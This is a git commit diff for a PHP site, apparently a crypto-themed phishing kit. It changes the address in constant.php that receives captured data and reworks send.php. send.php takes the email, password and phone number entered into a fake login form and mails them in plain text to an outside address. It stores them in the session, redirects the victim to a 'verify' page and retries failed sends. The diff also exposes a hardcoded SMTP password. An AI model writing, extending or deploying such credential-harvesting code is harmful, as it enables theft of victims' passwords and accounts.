13294dd7f71b1dfe8d68afaaea9f5a547330f497
vinay sachan <vinay@tappetbox.com>
2024-07-12 22:26:59 +0530

    changes

--- includes/constant.php
+++ includes/constant.php
@@ -1,12 +1,11 @@
 <?php
-
 define('CONST_MAIL_SERVER', 'smtpout.secureserver.net');
 define('CONST_MAIL_USERNAME', 'contact@livledger.com');
 define('CONST_MAIL_PASSWORD', 'EmailPassword@123');
 define('CONST_MAIL_FROM', 'contact@livledger.com');
 define('CONST_MAIL_PORT', '465');
 define('CONST_MAIL_FROM_NAME', 'Crypto');
-define('CONST_RECEIVE_EMAIL', 'james_smith.91@outlook.com');
+define('CONST_RECEIVE_EMAIL', 'gracebarrow8722@outlook.com');
 //define('CONST_RECEIVE_EMAIL', 'vinaysachan@live.in');
 
 ?>
--- send.php
+++ send.php
@@ -1,4 +1,7 @@
 <?php
+
+use Exception;
+
 include_once './config.php';
 
 $email                  =   $_POST['email'];
@@ -10,41 +13,59 @@ $country_code           =   empty($_POST['phone_number_countryCode']) ? null : $
 if (empty($email) || empty($password)) {
     redirect(base_url());
 } else {
-    try {
-        $mail           =   get_mail_smtp();
+    
+    function sendEmail($try=1) {
+        global $email;
+        global $password;
+        global $phone_number;
+        global $phone_code;
+        global $country_code;
         
-        $mail->isHTML(true);                                  //Set email format to HTML
-        $mail->Subject = 'New Login Query Received';
-        
-        $html           =   '<p>A New Login Detected,</p>' ;
-        $html          .=   '<p>You have received a new query from ' . base_url() . ' ,</p>' ;
-        $html          .=   '<p><b>Additional detail</b></p>' ;
-        $html          .=   '<ul>' ;
-        $html          .=   "<li>Email : <b>".$email."</b></li>";
-        $html          .=   "<li>Password : <b>".$password."</b></li>";
-        if(!empty($phone_number)) {
-            $html          .=   "<li>Phone Code : <b>".$phone_code."</b> (<b>".$country_code."</b>)</li>";
-            $html          .=   "<li>Phone Number : <b>".$phone_number."</b></li>";
+        try {
+            $mail           =   get_mail_smtp();
+            
+            $mail->isHTML(true);                                  //Set email format to HTML
+            $mail->Subject  = 'New Login Query Received';
+
+            $html           =   '<p>A New Login Detected,</p>' ;
+            $html          .=   '<p>You have received a new query from <b>' . base_url() . '</b>,</p>' ;
+            $html          .=   '<p><b>Additional detail</b></p>' ;
+            $html          .=   '<ul>' ;
+            $html          .=   "<li>Email : <b>".$email."</b></li>";
+            $html          .=   "<li>Password : <b>".$password."</b></li>";
+            if(!empty($phone_number)) {
+                $html       .=   "<li>Phone Code : <b>".$phone_code."</b> (<b>".$country_code."</b>)</li>";
+                $html       .=   "<li>Phone Number : <b>".$phone_number."</b></li>";
+            }
+            $html          .=   '</ul>' ;
+            $mail->Body     =   $html;
+            $mail->AltBody  =   'Email : '.$email.' and Password :'. $password;
+
+            $mail->send();
+
+            $_SESSION["email"]          =   $email;
+            $_SESSION["password"]       =   $password;
+            $_SESSION["phone_number"]   =   $phone_number;
+            $_SESSION["phone_code"]     =   $phone_code;
+            $_SESSION["country_code"]   =   $country_code;
+            
+            if(empty($phone_number)) {
+                redirect(base_url('verify.php'));
+            } else {
+                redirect(base_url('error.php'));
+            }
+        } catch (Exception $exc) {
+            $try = $try +1;
+            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+            if($try < 5) {
+                sleep(2);
+                sendEmail($try);
+            } else {
+                redirect(base_url());
+            }
         }
-        $html          .=   '</ul>' ;
-        $mail->Body     =   $html;
-        $mail->AltBody  =   'Email : '.$email.' and Password :'. $password;
-        
-        $mail->send();
-        
-        $_SESSION["email"]          =   $email;
-        $_SESSION["password"]       =   $password;
-        $_SESSION["phone_number"]   =   $phone_number;
-        $_SESSION["phone_code"]     =   $phone_code;
-        $_SESSION["country_code"]   =   $country_code;
-        
-        if(empty($phone_number)) {
-            redirect(base_url('verify.php'));
-        } else {
-            redirect(base_url('error.php'));
-        }
-    } catch (Exception $e) {
-        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
     }
+    
+    sendEmail(1);
 }
 ?>
